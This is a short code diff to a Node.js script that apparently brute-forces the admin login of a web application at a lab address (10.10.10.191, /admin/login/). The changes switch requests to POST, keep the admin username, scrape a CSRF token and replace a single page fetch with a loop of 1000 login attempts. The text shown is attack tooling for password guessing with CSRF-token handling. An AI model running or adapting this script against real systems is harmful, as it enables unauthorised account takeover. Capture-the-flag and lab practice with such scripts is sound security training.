@@ -3,7 +3,7 @@ const http = require('http');
 const host = 'http://10.10.10.191';
 const formPath = '/admin/login/';
 const targetUri = host + formPath;
-const method = 'GET';
+const method = 'POST';
 const rx = /input.+?name="tokenCSRF".+?value="(.+?)"/;
 
 const username = 'admin';
@@ -78,7 +78,8 @@ const buildRequest = (entry) => {
 
 const main = () => {
   console.log(`Let's go!`);
-getPage();
+  let i = 0;
+  while (i < 1000) buildRequest(i++)
 }
 
 main();
